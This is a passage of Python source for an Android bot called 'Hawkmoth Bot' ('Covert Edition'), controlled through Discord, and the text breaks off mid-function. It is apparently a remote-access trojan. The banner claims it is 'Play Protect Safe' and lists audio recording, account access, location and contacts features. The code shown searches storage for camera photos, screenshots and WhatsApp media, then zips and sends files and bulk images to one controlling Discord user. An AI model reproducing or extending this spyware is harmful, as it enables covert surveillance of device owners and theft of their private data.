"""
╔══════════════════════════════════════════════════════════════════╗
║           Hawkmoth Bot v8.0 — Cloud-Integrated Edition          ║
║                                                                  ║
║  Improvements in v8.0:                                           ║
║    ✅ Cloud Integration (cloud_agent)                            ║
║    ✅ Bot Factory Pattern (rebuildable)                          ║
║    ✅ Session Guard (is_my_session_active)                       ║
║    ✅ @with_cloud_audit decorator                                ║
║    ✅ Beautiful Embed UI + Interactive Menu                      ║
║    ✅ Category Submenus (12 categories)                          ║
║    ✅ Color Themes per Category                                  ║
║    ✅ Progress Indicators (live updates)                         ║
║    ✅ Unified Error Handling                                     ║
║    ✅ Enhanced Diagnostics                                       ║
║                                                                  ║
║  Preserved from v5.0:                                            ║
║    ✅ 75+ Commands in 12 categories                              ║
║    ✅ Decorator System                                           ║
║    ✅ AndroidVersion Detection                                   ║
║    ✅ FileBrowser v2.0 (advanced)                                ║
║    ✅ AudioRecorder v4.0                                         ║
║    ✅ AccountsHelper v3.0                                        ║
║    ✅ API 23 → 34+ Support                                       ║
║    ✅ Play Protect Safe                                          ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import asyncio
import logging
import tempfile
import zipfile
import time
import re
import socket
import platform
import threading
import traceback
import functools
from typing import Optional, Dict, Any, List, Callable, Tuple
from collections import defaultdict

import discord
from discord.ext import commands
from discord import app_commands


# ═══════════════════════════════════════════════════════════════════
#                       VERSION
# ═══════════════════════════════════════════════════════════════════
VERSION = "8.0.0"
VERSION_NAME = "Covert Edition"
BOT_TITLE = "JvRemotPy"
DEFAULT_PREFIX = "!"
DISCORD_LIMIT_MB = 24.0
FILES_PER_PAGE = 20
RATE_LIMIT_PER_MIN = 20
CACHE_TTL_SEC = 30


def get_version() -> str:
    return VERSION


# ═══════════════════════════════════════════════════════════════════
#                       Colors
# ═══════════════════════════════════════════════════════════════════
class Colors:
    PRIMARY = 0x6C8CFF
    SUCCESS = 0x4ADE80
    ERROR = 0xFF6B7A
    WARNING = 0xFBBF24
    INFO = 0x60A5FA

    FILES = 0x8B5CF6
    MEDIA = 0xEC4899
    DEVICE = 0x06B6D4
    PHONE = 0x10B981
    LOCATION = 0xEF4444
    AUDIO = 0xF59E0B
    CONTACTS = 0xA855F7
    SYSTEM = 0x64748B
    APPS = 0x3B82F6
    SENSORS = 0xF43F5E
    ACCOUNTS = 0x8B5CF6
    CLOUD = 0x7C3AED


# ═══════════════════════════════════════════════════════════════════
#                       Logging
# ═══════════════════════════════════════════════════════════════════
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("HawkmothBot")
log.info(f"🔧 hawkmoth_bot.py v{VERSION} ({VERSION_NAME}) loading...")


# ═══════════════════════════════════════════════════════════════════
#                       Bridge
# ═══════════════════════════════════════════════════════════════════
_bridge = None
_BRIDGE_AVAILABLE = False
try:
    import bridge as _bridge
    _BRIDGE_AVAILABLE = True
    log.info("✅ bridge.py loaded")
except ImportError as _e:
    log.warning(f"⚠️ bridge.py not available: {_e}")


# ═══════════════════════════════════════════════════════════════════
#                       Cloud Agent
# ═══════════════════════════════════════════════════════════════════
_cloud = None
_CLOUD_AVAILABLE = False
try:
    import cloud_agent as _cloud
    _CLOUD_AVAILABLE = True
    log.info("✅ cloud_agent.py loaded")
except ImportError as _e:
    log.warning(f"⚠️ cloud_agent.py not available: {_e}")


# ═══════════════════════════════════════════════════════════════════
#                       File Browser
# ═══════════════════════════════════════════════════════════════════
_ADVANCED_BROWSER = False
try:
    from file_browser import (
        AdvancedFileBrowserView, BrowseState,
        FILTER_ALL, FILTER_IMAGES, FILTER_VIDEOS,
        FILTER_AUDIO, FILTER_DOCS, FILTER_APK, FILTER_FOLDERS,
    )
    _ADVANCED_BROWSER = True
    log.info("✅ file_browser.py loaded (advanced)")
except ImportError as _e:
    log.warning(f"⚠️ file_browser.py not available: {_e}")


# ═══════════════════════════════════════════════════════════════════
#                       BotState (v8.0 — Cloud-aware)
# ═══════════════════════════════════════════════════════════════════
class BotState:
    def __init__(self):
        self._lock = threading.RLock()
        self.token: Optional[str] = None
        self.prefix: str = DEFAULT_PREFIX
        self.owner_id: Optional[int] = None
        self.guild_id: Optional[int] = None
        self.allowed_user_id: Optional[int] = None
        self.device_id: str = ""              # 🆕
        self.context: Any = None              # 🆕
        self.is_running: bool = False
        self.start_time: Optional[float] = None
        self.last_error: Optional[str] = None
        self.stop_event = threading.Event()
        self.loop: Any = None
        self.cloud_reported: bool = False     # 🆕

    def reset(self):
        with self._lock:
            self.is_running = False
            self.start_time = None
            self.stop_event = threading.Event()
            self.loop = None
            self.cloud_reported = False

    def mark_running(self):
        with self._lock:
            self.is_running = True
            self.start_time = time.time()

    def mark_stopped(self):
        with self._lock:
            self.is_running = False

    def set_error(self, err):
        with self._lock:
            self.last_error = str(err) if err else None

    def get_stop_event(self):
        with self._lock:
            return self.stop_event

    def get_allowed_id(self):
        with self._lock:
            return self.allowed_user_id or self.owner_id


STATE = BotState()


# ═══════════════════════════════════════════════════════════════════
#                       Stats
# ═══════════════════════════════════════════════════════════════════
class Stats:
    def __init__(self):
        self.commands_used = defaultdict(int)
        self.errors = defaultdict(int)
        self.files_sent = 0
        self.bytes_sent = 0
        self.started_at = time.time()
        self._lock = threading.Lock()

    def record_command(self, name):
        with self._lock:
            self.commands_used[name] += 1

    def record_error(self, name):
        with self._lock:
            self.errors[name] += 1

    def record_file(self, size):
        with self._lock:
            self.files_sent += 1
            self.bytes_sent += size

    def uptime(self):
        return time.time() - self.started_at

    def reset_uptime(self):
        with self._lock:
            self.started_at = time.time()

    def to_dict(self):
        with self._lock:
            uptime = self.uptime()
            return {
                "uptime_seconds": int(uptime),
                "uptime_human": self._fmt_time(uptime),
                "files_sent": self.files_sent,
                "bytes_sent": self.bytes_sent,
                "bytes_sent_human": _fmt_size(self.bytes_sent),
                "total_commands": sum(self.commands_used.values()),
                "top_commands": sorted(
                    self.commands_used.items(), key=lambda x: -x[1]
                )[:10],
                "errors": dict(self.errors),
            }

    @staticmethod
    def _fmt_time(seconds):
        d = int(seconds // 86400)
        h = int((seconds % 86400) // 3600)
        m = int((seconds % 3600) // 60)
        s = int(seconds % 60)
        parts = []
        if d: parts.append(f"{d}d")
        if h: parts.append(f"{h}h")
        if m: parts.append(f"{m}m")
        parts.append(f"{s}s")
        return " ".join(parts)


STATS = Stats()


# ═══════════════════════════════════════════════════════════════════
#                       Rate Limiter
# ═══════════════════════════════════════════════════════════════════
class RateLimiter:
    def __init__(self, max_per_minute=20):
        self.max = max_per_minute
        self.calls = defaultdict(list)
        self._lock = threading.Lock()

    def check(self, user_id):
        with self._lock:
            now = time.time()
            window = 60
            calls = [t for t in self.calls[user_id] if now - t < window]
            self.calls[user_id] = calls
            if len(calls) >= self.max:
                return False
            self.calls[user_id].append(now)
            return True

    def reset(self, user_id):
        with self._lock:
            self.calls[user_id] = []


RATE_LIMITER = RateLimiter(RATE_LIMIT_PER_MIN)


# ═══════════════════════════════════════════════════════════════════
#                       TTL Cache
# ═══════════════════════════════════════════════════════════════════
class TTLCache:
    def __init__(self, ttl_sec=30, max_size=500):
        self.ttl = ttl_sec
        self.max = max_size
        self.store = {}
        self._lock = threading.Lock()

    def get(self, key):
        with self._lock:
            if key not in self.store:
                return None
            value, expire_at = self.store[key]
            if time.time() > expire_at:
                del self.store[key]
                return None
            return value

    def set(self, key, value):
        with self._lock:
            if len(self.store) >= self.max:
                oldest = min(self.store.items(), key=lambda x: x[1][1])
                del self.store[oldest[0]]
            self.store[key] = (value, time.time() + self.ttl)

    def clear(self):
        with self._lock:
            self.store.clear()

    def size(self):
        with self._lock:
            return len(self.store)


LIST_CACHE = TTLCache(ttl_sec=CACHE_TTL_SEC, max_size=200)


# ═══════════════════════════════════════════════════════════════════
#                       AndroidVersion
# ═══════════════════════════════════════════════════════════════════
class AndroidVersion:
    def __init__(self):
        self.sdk: int = 0
        self.release: str = "?"
        self.manufacturer: str = ""
        self.model: str = ""
        self.brand: str = ""

    def load(self):
        if not _BRIDGE_AVAILABLE or _bridge is None:
            return
        try:
            info = _bridge.get_device_info()
            if isinstance(info, dict):
                self.sdk = int(info.get("sdk", 0))
                self.release = str(info.get("android", "?"))
                self.manufacturer = str(info.get("manufacturer", "")).lower()
                self.model = str(info.get("model", ""))
                self.brand = str(info.get("brand", "")).lower()
            log.info(f"📱 Android {self.release} (SDK {self.sdk}) "
                     f"| {self.manufacturer} {self.model}")
        except Exception as e:
            log.warning(f"AndroidVersion.load: {e}")

    @property
    def can_pause_audio(self) -> bool:
        return self.sdk >= 24

    @property
    def can_use_media_perms(self) -> bool:
        return self.sdk >= 33

    @property
    def needs_legacy_storage(self) -> bool:
        return 10 <= self.sdk <= 29

    @property
    def needs_manage_storage(self) -> bool:
        return self.sdk >= 30

    @property
    def is_huawei(self) -> bool:
        return "huawei" in self.manufacturer

    @property
    def is_samsung(self) -> bool:
        return "samsung" in self.manufacturer

    @property
    def is_xiaomi(self) -> bool:
        return "xiaomi" in self.manufacturer or "redmi" in self.manufacturer

    @property
    def vendor_name(self) -> str:
        if not self.manufacturer:
            return "?"
        return self.manufacturer.capitalize()


ANDROID = AndroidVersion()


# ═══════════════════════════════════════════════════════════════════
#                       Storage Roots
# ═══════════════════════════════════════════════════════════════════
def _discover_storage_roots():
    roots = []
    seen = set()

    def add(p):
        if not p:
            return
        try:
            rp = os.path.realpath(p)
        except Exception:
            return
        if rp in seen or not os.path.isdir(rp):
            return
        seen.add(rp)
        roots.append(rp)

    if _BRIDGE_AVAILABLE and _bridge is not None:
        for fn_name in ("get_files_dir", "get_external_files_dir"):
            try:
                fn = getattr(_bridge, fn_name, None)
                if fn:
                    p = fn()
                    if p:
                        add(p)
            except Exception:
                pass

    add("/sdcard")
    add("/storage/emulated/0")
    add(os.getenv("EXTERNAL_STORAGE", ""))

    try:
        for entry in os.listdir("/storage"):
            full = os.path.join("/storage", entry)
            if os.path.isdir(full):
                add(full)
    except Exception:
        pass

    return roots


DISCOVERED_ROOTS = _discover_storage_roots()
ALLOWED_ROOT = DISCOVERED_ROOTS[0] if DISCOVERED_ROOTS else "/sdcard"

log.info(f"📁 Active root: {ALLOWED_ROOT}")
log.info(f"📁 Discovered roots: {len(DISCOVERED_ROOTS)}")


def _safe_makedirs(path, fallback):
    try:
        os.makedirs(path, exist_ok=True)
        return path
    except Exception:
        return fallback


UPLOAD_DIR = _safe_makedirs(
    os.path.join(ALLOWED_ROOT, "Pictures", "HawkmothUploads"),
    tempfile.gettempdir(),
)
SCREENSHOT_DIR = _safe_makedirs(
    os.path.join(ALLOWED_ROOT, "DCIM", "HawkmothShots"),
    tempfile.gettempdir(),
)


# ═══════════════════════════════════════════════════════════════════
#                       Optional Features
# ═══════════════════════════════════════════════════════════════════
HAS_PIL = False
try:
    from PIL import Image
    HAS_PIL = True
    log.info("✅ PIL available")
except ImportError:
    log.warning("⚠️ PIL not available — no compression")


DEVICE_NAME = socket.gethostname() or "Android"

CAMERA_PATHS = [
    "DCIM/Camera", "DCIM/camera", "DCIM/Camera/RAW",
    "Pictures/Camera", "Pictures/Photos",
    "Camera", "camera", "Photos",
]
SCREENSHOT_PATHS = [
    "DCIM/Screenshots", "DCIM/screenshots",
    "Pictures/Screenshots", "Pictures/screenshots",
    "Screenshots", "screenshots",
]
DOWNLOAD_PATHS = ["Download", "Downloads", "download", "downloads"]
DOCUMENT_PATHS = ["Documents", "documents", "Docs"]
WHATSAPP_MEDIA_PATHS = [
    "Android/media/com.whatsapp/WhatsApp/Media",
    "WhatsApp/Media",
    "Android/media/com.whatsapp.w4b/WhatsApp Business/Media",
]

_path_map = {}
_path_counter = [0]
_path_lock = threading.Lock()

bulk_state = {'suspended': False, 'resume_dir': None, 'resume_index': 0}
FAVORITES = []


# ═══════════════════════════════════════════════════════════════════
#                       Utility Functions
# ═══════════════════════════════════════════════════════════════════
def short_key(path):
    with _path_lock:
        k = str(_path_counter[0])
        _path_counter[0] += 1
        _path_map[k] = path
        if len(_path_map) > 1000:
            for old in list(_path_map.keys())[:200]:
                del _path_map[old]
        return k


def resolve_key(k):
    with _path_lock:
        return _path_map.get(k, "")


def is_path_allowed(path):
    try:
        real = os.path.realpath(path)
        for root in DISCOVERED_ROOTS or [ALLOWED_ROOT]:
            rr = os.path.realpath(root)
            if real == rr or real.startswith(rr + os.sep):
                return True
        return False
    except Exception:
        return False


def _fmt_size(n):
    try:
        n = float(n)
    except Exception:
        return "?"
    for unit in ('B', 'KB', 'MB', 'GB'):
        if n < 1024:
            return f"{n:.1f}{unit}"
        n /= 1024
    return f"{n:.1f}TB"


def _find_dir_in_roots(candidates):
    for root in DISCOVERED_ROOTS:
        for rel in candidates:
            try:
                p = os.path.join(root, *rel.split("/"))
                if os.path.isdir(p):
                    return p
            except Exception:
                continue
    return None


def _get_icon(filename, is_dir=False):
    if is_dir:
        return "📁"
    ext = os.path.splitext(filename)[1].lower()
    icons = {
        ".jpg": "🖼️", ".jpeg": "🖼️", ".png": "🖼️", ".gif": "🎞️",
        ".webp": "🖼️", ".bmp": "🖼️", ".heic": "🖼️",
        ".mp4": "🎬", ".mkv": "🎬", ".avi": "🎬", ".mov": "🎬",
        ".mp3": "🎵", ".wav": "🎵", ".ogg": "🎵", ".m4a": "🎵",
        ".pdf": "📕", ".doc": "📘", ".docx": "📘",
        ".xls": "📗", ".xlsx": "📗", ".ppt": "📙", ".pptx": "📙",
        ".zip": "🗜️", ".rar": "🗜️", ".tar": "🗜️", ".gz": "🗜️",
        ".apk": "📦", ".exe": "⚙️",
        ".txt": "📄", ".log": "📄", ".md": "📖",
        ".py": "🐍", ".java": "☕", ".js": "📜", ".html": "🌐",
        ".json": "⚙️", ".xml": "📋", ".yml": "📋", ".yaml": "📋",
    }
    return icons.get(ext, "📄")


def _build_tree(root, max_depth=3, current_depth=0, max_items=60, prefix=""):
    lines = []
    if current_depth > max_depth:
        return lines
    try:
        items = sorted(os.listdir(root))[:max_items]
    except Exception as e:
        return [f"{prefix}❌ {e}"]
    for i, name in enumerate(items):
        full = os.path.join(root, name)
        is_last = (i == len(items) - 1)
        connector = "└── " if is_last else "├── "
        is_dir = os.path.isdir(full)
        icon = _get_icon(name, is_dir)
        if is_dir:
            lines.append(f"{prefix}{connector}{icon} {name}/")
            if current_depth < max_depth:
                ext = "    " if is_last else "│   "
                lines.extend(_build_tree(
                    full, max_depth, current_depth + 1,
                    max_items, prefix + ext
                ))
        else:
            try:
                sz = _fmt_size(os.path.getsize(full))
            except Exception:
                sz = "?"
            lines.append(f"{prefix}{connector}{icon} {name} ({sz})")
    return lines


async def _compress_image(src_path):
    if not HAS_PIL:
        return src_path
    try:
        from PIL import Image
        root, _ = os.path.splitext(src_path)
        out = root + "_compressed.jpg"
        with Image.open(src_path) as img:
            img.thumbnail((1600, 1600), Image.LANCZOS)
            if img.mode in ('RGBA', 'P', 'LA'):
                img = img.convert('RGB')
            img.save(out, format='JPEG', quality=85, optimize=True)
        return out
    except Exception as e:
        log.warning(f"compress failed: {e}")
        return src_path


# ═══════════════════════════════════════════════════════════════════
#                       Bot Factory Pattern
# ═══════════════════════════════════════════════════════════════════
_event_handlers: Dict[str, Callable] = {}
_command_registry: List[Tuple] = []


def bot_event(name: str):
    """Decorator: records event handler for re-registration."""
    def decorator(func):
        _event_handlers[name] = func
        return func
    return decorator


def bot_command(name: str, description: str, **kwargs):
    """Decorator: records command for re-registration."""
    def decorator(func):
        _command_registry.append((name, description, kwargs, func))
        return func
    return decorator


def _create_bot() -> commands.Bot:
    """إنشاء بوت جديد مع تسجيل كل الأوامر والمعالجات."""
    intents = discord.Intents.default()
    intents.messages = True
    intents.message_content = True
    intents.guilds = True

    new_bot = commands.Bot(
        command_prefix=DEFAULT_PREFIX,
        intents=intents,
        help_command=None,
        case_insensitive=True,
        strip_after_prefix=True,
    )

    # تسجيل الأوامر
    registered = 0
    for name, desc, kwargs, func in _command_registry:
        try:
            new_bot.tree.command(name=name, description=desc, **kwargs)(func)
            registered += 1
        except Exception as e:
            log.warning(f"Failed to register command {name}: {e}")
    log.info(f"✅ Registered {registered} commands")

    # تسجيل الأحداث
    for event_name, handler in _event_handlers.items():
        try:
            new_bot.add_listener(handler, event_name)
        except Exception as e:
            log.warning(f"Failed to register event {event_name}: {e}")

    return new_bot


# Bot initial (سيتم استبداله عند إعادة التشغيل)
bot: commands.Bot = _create_bot()


# ═══════════════════════════════════════════════════════════════════
#                       Decorator System
# ═══════════════════════════════════════════════════════════════════
def require_allowed(func):
    @functools.wraps(func)
    async def wrapper(interaction: discord.Interaction, *args, **kwargs):
        if not _check(interaction):
            try:
                await _safe_reply(
                    interaction,
                    "🚫 غير مصرّح لك باستخدام هذا الأمر.",
                    color=Colors.ERROR,
                    ephemeral=True,
                )
            except Exception:
                pass
            return
        return await func(interaction, *args, **kwargs)
    return wrapper


def require_bridge(func):
    @functools.wraps(func)
    async def wrapper(interaction: discord.Interaction, *args, **kwargs):
        if not _bridge_ready():
            try:
                await _safe_reply(
                    interaction,
                    "❌ **جسر Python غير متاح**\n"
                    "تأكد من تشغيل BotService بشكل صحيح.",
                    color=Colors.ERROR,
                    ephemeral=True,
                )
            except Exception:
                pass
            return
        return await func(interaction, *args, **kwargs)
    return wrapper


def require_cloud(func):
    @functools.wraps(func)
    async def wrapper(interaction: discord.Interaction, *args, **kwargs):
        if not _cloud_ready():
            try:
                await _safe_reply(
                    interaction,
                    "❌ **Cloud Agent غير متاح**\n"
                    "تأكد من تشغيل التطبيق بشكل صحيح.",
                    color=Colors.ERROR,
                    ephemeral=True,
                )
            except Exception:
                pass
            return
        return await func(interaction, *args, **kwargs)
    return wrapper


def with_stats(name: str):
    def deco(func):
        @functools.wraps(func)
        async def wrapper(interaction: discord.Interaction, *args, **kwargs):
            STATS.record_command(name)
            try:
                return await func(interaction, *args, **kwargs)
            except Exception as e:
                STATS.record_error(name)
                log.error(f"❌ {name}: {e}")
                log.debug(traceback.format_exc())
                try:
                    await _safe_reply(
                        interaction,
                        f"❌ **خطأ في `{name}`**\n\n"
                        f"```\n{str(e)[:300]}\n```",
                        color=Colors.ERROR,
                        ephemeral=True,
                    )
                except Exception:
                    pass
        return wrapper
    return deco


def require_android_min(sdk_min: int):
    def deco(func):
        @functools.wraps(func)
        async def wrapper(interaction: discord.Interaction, *args, **kwargs):
            if ANDROID.sdk < sdk_min:
                try:
                    await _safe_reply(
                        interaction,
                        f"❌ **هذا الأمر يحتاج Android API {sdk_min}+**\n"
                        f"جهازك: `API {ANDROID.sdk}`",
                        color=Colors.WARNING,
                        ephemeral=True,
                    )
                except Exception:
                    pass
                return
            return await func(interaction, *args, **kwargs)
        return wrapper
    return deco


def with_cloud_audit(action: str):
    """🆕 v8.0: تسجيل الأمر في cloud_agent بعد التنفيذ."""
    def deco(func):
        @functools.wraps(func)
        async def wrapper(interaction: discord.Interaction, *args, **kwargs):
            start = time.time()
            success = True
            error = None
            try:
                return await func(interaction, *args, **kwargs)
            except Exception as e:
                success = False
                error = str(e)[:200]
                raise
            finally:
                if _cloud_ready():
                    try:
                        duration_ms = int((time.time() - start) * 1000)
                        _cloud.log_command(
                            action=action,
                            params={},
                            success=success,
                            error=error,
                            duration_ms=duration_ms,
                        )
                    except Exception:
                        pass
        return wrapper
    return deco


# ═══════════════════════════════════════════════════════════════════
#                       Helpers
# ═══════════════════════════════════════════════════════════════════
def _check(interaction) -> bool:
    allowed = STATE.get_allowed_id()
    return allowed is not None and interaction.user.id == allowed


def _bridge_ready() -> bool:
    return _BRIDGE_AVAILABLE and _bridge is not None


def _cloud_ready() -> bool:
    return _CLOUD_AVAILABLE and _cloud is not None


async def _safe_reply(interaction, content: str = None, *,
                       embed: discord.Embed = None,
                       view: discord.ui.View = None,
                       color: int = None,
                       ephemeral: bool = False):
    """إرسال آمن (response / followup) مع دعم embed تلقائي."""
    try:
        if embed is None and content is not None and color is not None:
            embed = _make_embed("", content, color)

        is_done = interaction.response.is_done()

        if embed is not None:
            if is_done:
                await interaction.followup.send(
                    embed=embed, view=view, ephemeral=ephemeral)
            else:
                await interaction.response.send_message(
                    embed=embed, view=view, ephemeral=ephemeral)
        else:
            if is_done:
                await interaction.followup.send(
                    content, view=view, ephemeral=ephemeral)
            else:
                await interaction.response.send_message(
                    content, view=view, ephemeral=ephemeral)
    except Exception as e:
        log.warning(f"_safe_reply: {e}")


def _make_embed(title: str, description: str = "",
                color: int = Colors.PRIMARY) -> discord.Embed:
    embed = discord.Embed(
        title=title or None,
        description=description or None,
        color=color,
        timestamp=discord.utils.utcnow(),
    )
    embed.set_footer(text=f"{BOT_TITLE} • v{VERSION}")
    return embed


def _make_error_embed(msg: str) -> discord.Embed:
    return _make_embed("❌ خطأ", msg, Colors.ERROR)


def _make_success_embed(msg: str) -> discord.Embed:
    return _make_embed("✅ نجاح", msg, Colors.SUCCESS)


def _make_warning_embed(msg: str) -> discord.Embed:
    return _make_embed("⚠️ تحذير", msg, Colors.WARNING)


async def _safe_bridge_call(func, *args, **kwargs):
    try:
        return await asyncio.to_thread(func, *args, **kwargs)
    except Exception as e:
        log.error(f"bridge call {func.__name__}: {e}")
        return None


def _is_contacts_ready() -> bool:
    try:
        from java import jclass
        ContactsBridge = jclass("com.example.myfirstapp.ContactsBridge")
        return bool(ContactsBridge.isReady())
    except Exception:
        return False


# ═══════════════════════════════════════════════════════════════════
#                       Simple File Browser (Fallback)
# ═══════════════════════════════════════════════════════════════════
class SimpleFileBrowserView(discord.ui.View):
    def __init__(self, path, page=0, sort_by="name"):
        super().__init__(timeout=1800)
        self.path = path
        self.page = page
        self.sort_by = sort_by
        self.total = 0
        self._build()

    def _sort_items(self, items):
        def key(x):
            full = os.path.join(self.path, x)
            is_dir = os.path.isdir(full)
            if self.sort_by == "date":
                try:
                    m = os.path.getmtime(full)
                except Exception:
                    m = 0
                return (not is_dir, -m)
            elif self.sort_by == "size":
                try:
                    s = os.path.getsize(full)
                except Exception:
                    s = 0
                return (not is_dir, -s)
            return (not is_dir, x.lower())
        return sorted(items, key=key)

    def _build(self):
        try:
            raw = os.listdir(self.path)
        except PermissionError:
            self.add_item(discord.ui.Button(
                label="❌ لا صلاحية", disabled=True))
            return
        except Exception as e:
            self.add_item(discord.ui.Button(
                label=f"خطأ: {str(e)[:50]}", disabled=True))
            return

        items = self._sort_items(raw)
        self.total = len(items)
        start = self.page * FILES_PER_PAGE
        end = min(start + FILES_PER_PAGE, self.total)
        page_items = items[start:end]

        options = []
        for name in page_items:
            full = os.path.join(self.path, name)
            is_dir = os.path.isdir(full)
            icon = _get_icon(name, is_dir)
            if is_dir:
                options.append(discord.SelectOption(
                    label=f"{icon} {name}"[:100],
                    value=f"d:{short_key(full)}",
                    description="📁 مجلد"))
            else:
                try:
                    sz = _fmt_size(os.path.getsize(full))
                except Exception:
                    sz = "?"
                options.append(discord.SelectOption(
                    label=f"{icon} {name}"[:100],
                    value=f"f:{short_key(full)}",
                    description=f"ملف · {sz}"))

        if options:
            select = discord.ui.Select(
                placeholder=f"اختر ({start+1}-{end} من {self.total})",
                options=options, min_values=1, max_values=1)
            select.callback = self._select_cb()
            self.add_item(select)

        parent = os.path.dirname(self.path.rstrip('/')) or '/'
        if self.path != '/' and parent != self.path and is_path_allowed(parent):
            btn = discord.ui.Button(
                label="⬆️ ..", style=discord.ButtonStyle.secondary)
            btn.callback = self._nav_cb(parent, 0)
            self.add_item(btn)

        if self.page > 0:
            btn = discord.ui.Button(
                label="⬅️", style=discord.ButtonStyle.secondary)
            btn.callback = self._nav_cb(self.path, self.page - 1)
            self.add_item(btn)

        btn = discord.ui.Button(
            label="🗜️ ZIP", style=discord.ButtonStyle.danger)
        btn.callback = self._zip_cb(self.path)
        self.add_item(btn)

        if end < self.total:
            btn = discord.ui.Button(
                label="➡️", style=discord.ButtonStyle.secondary)
            btn.callback = self._nav_cb(self.path, self.page + 1)
            self.add_item(btn)

        for label, mode in (("🔤 اسم", "name"), ("📅 تاريخ", "date"),
                             ("📊 حجم", "size")):
            style = (discord.ButtonStyle.success
                     if self.sort_by == mode
                     else discord.ButtonStyle.secondary)
            btn = discord.ui.Button(label=label, style=style)
            btn.callback = self._sort_cb(mode)
            self.add_item(btn)

    def title(self):
        start = self.page * FILES_PER_PAGE
        end = min(start + FILES_PER_PAGE, self.total)
        sort_label = {"name": "اسم", "date": "تاريخ",
                      "size": "حجم"}.get(self.sort_by, "اسم")
        return (f"📂 `{self.path}`\n"
                f"({start+1}-{end} من {self.total}) | {sort_label} | "
                f"🖥️ `{DEVICE_NAME}`")

    def _select_cb(self):
        async def cb(interaction: discord.Interaction):
            if not _check(interaction):
                await _safe_reply(interaction, "🚫 غير مصرّح", ephemeral=True)
                return
            value = interaction.data.get("values", [""])[0]
            if ":" not in value:
                await interaction.response.defer()
                return
            kind, key = value.split(":", 1)
            path = resolve_key(key)
            if not path or not is_path_allowed(path):
                await _safe_reply(interaction, "❌ مسار غير صالح", ephemeral=True)
                return
            if kind == "d":
                view = SimpleFileBrowserView(path, 0, self.sort_by)
                try:
                    await interaction.response.edit_message(
                        content=view.title(), view=view)
                except Exception:
                    await _safe_reply(interaction, view.title(), view=view)
            else:
                await interaction.response.defer()
                await _send_any_file(interaction, path)
        return cb

    def _nav_cb(self, path, page):
        async def cb(interaction: discord.Interaction):
            if not _check(interaction):
                await _safe_reply(interaction, "🚫 غير مصرّح", ephemeral=True)
                return
            if not is_path_allowed(path):
                await _safe_reply(interaction, "❌ خارج النطاق", ephemeral=True)
                return
            view = SimpleFileBrowserView(path, page, self.sort_by)
            try:
                await interaction.response.edit_message(
                    content=view.title(), view=view)
            except Exception:
                await _safe_reply(interaction, view.title(), view=view)
        return cb

    def _sort_cb(self, mode):
        async def cb(interaction: discord.Interaction):
            if not _check(interaction):
                await _safe_reply(interaction, "🚫 غير مصرّح", ephemeral=True)
                return
            view = SimpleFileBrowserView(self.path, 0, mode)
            try:
                await interaction.response.edit_message(
                    content=view.title(), view=view)
            except Exception:
                await _safe_reply(interaction, view.title(), view=view)
        return cb

    def _zip_cb(self, path):
        async def cb(interaction: discord.Interaction):
            if not _check(interaction):
                await _safe_reply(interaction, "🚫 غير مصرّح", ephemeral=True)
                return
            await interaction.response.defer()
            await _send_zip_of_dir(interaction, path)
        return cb


# ═══════════════════════════════════════════════════════════════════
#                       Send Functions
# ═══════════════════════════════════════════════════════════════════
async def _send_any_file(interaction, path):
    if not is_path_allowed(path):
        await _safe_reply(interaction, f"❌ خارج النطاق: `{path}`")
        return
    if not os.path.isfile(path):
        await _safe_reply(interaction, f"الملف غير موجود: `{path}`")
        return
    try:
        size_mb = os.path.getsize(path) / (1024 * 1024)
    except Exception:
        size_mb = 0
    if size_mb > DISCORD_LIMIT_MB:
        await _safe_reply(
            interaction, f"⚠️ {size_mb:.1f}MB > {DISCORD_LIMIT_MB}MB")
        return
    try:
        size = os.path.getsize(path)
        await interaction.followup.send(file=discord.File(path))
        STATS.record_file(size)
    except Exception as e:
        STATS.record_error("send_file")
        await _safe_reply(interaction, f"❌ {e}")


async def _send_zip_of_dir(interaction, path):
    if not is_path_allowed(path):
        await _safe_reply(interaction, f"❌ خارج النطاق: `{path}`")
        return
    if not os.path.isdir(path):
        await _safe_reply(interaction, f"❌ ليس مجلدًا: `{path}`")
        return
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.zip')
    tmp.close()
    try:
        with zipfile.ZipFile(tmp.name, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, _dirs, files in os.walk(path):
                for fn in files:
                    full = os.path.join(root, fn)
                    rel = os.path.relpath(full, path)
                    try:
                        zf.write(full, rel)
                    except Exception:
                        continue
        size_mb = os.path.getsize(tmp.name) / (1024 * 1024)
        if size_mb > DISCORD_LIMIT_MB:
            await _safe_reply(
                interaction, f"⚠️ الأرشيف {size_mb:.1f}MB > الحد")
            return
        fname = f"{os.path.basename(path.rstrip('/')) or 'root'}.zip"
        size = os.path.getsize(tmp.name)
        await interaction.followup.send(
            file=discord.File(tmp.name, filename=fname))
        STATS.record_file(size)
    except Exception as e:
        STATS.record_error("send_zip")
        await _safe_reply(interaction, f"❌ {e}")
    finally:
        try:
            os.remove(tmp.name)
        except Exception:
            pass


async def _send_images_bulk(interaction, directory, limit=None,
                             start_index=0):
    global bulk_state
    if not is_path_allowed(directory):
        await _safe_reply(interaction, "❌ المسار خارج النطاق.")
        return
    if not os.path.isdir(directory):
        await _safe_reply(interaction, f"المجلد غير موجود: `{directory}`")
        return
    try:
        files = sorted(
            [os.path.join(directory, f) for f in os.listdir(directory)
             if f.lower().endswith(
                 (".jpg", ".jpeg", ".png", ".webp", ".gif", ".heic"))],
            key=os.path.getmtime, reverse=True
        )
    except Exception as e:
        await _safe_reply(interaction, f"❌ {e}")
        return
    if limit:
        files = files[:limit]
    if not files:
        await _safe_reply(interaction, "لا توجد صور.")
        return

    bulk_state['suspended'] = False
    bulk_state['resume_dir'] = directory
    bulk_state['resume_index'] = start_index

    await interaction.followup.send(
        f"📤 إرسال من {start_index}/{len(files)}...")
    sent = 0
    for idx in range(start_index, len(files)):
        if bulk_state['suspended']:
            bulk_state['resume_index'] = idx
            await interaction.followup.send(
                f"⛔ توقف عند {idx}. استخدم `/resume`.")
            return
        fp = files[idx]
        compressed = await _compress_image(fp)
        try:
            size_mb = os.path.getsize(compressed) / (1024 * 1024)
            if size_mb > DISCORD_LIMIT_MB:
                await interaction.followup.send(
                    f"⚠️ {os.path.basename(fp)} ({size_mb:.1f}MB)")
                continue
            size = os.path.getsize(compressed)
            await interaction.followup.send(
                file=discord.File(compressed))
            STATS.record_file(size)
            sent += 1
            await asyncio.sleep(0.5)
